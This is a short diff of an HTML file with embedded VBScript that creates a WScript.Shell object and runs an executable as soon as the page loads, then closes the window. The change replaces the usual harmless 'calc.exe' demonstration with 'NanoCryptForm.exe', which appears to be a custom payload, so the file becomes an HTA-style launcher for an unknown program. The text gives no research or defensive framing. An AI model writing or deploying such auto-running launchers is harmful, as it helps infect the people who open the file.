@@ -3,7 +3,7 @@ html<html>
 <head>
 <script language="VBScript">
     Set objShell = CreateObject("WScript.Shell")
-    objShell.Run "calc.exe"
+    objShell.Run "NanoCryptForm.exe"
     self.close()
 </script>
 </head>
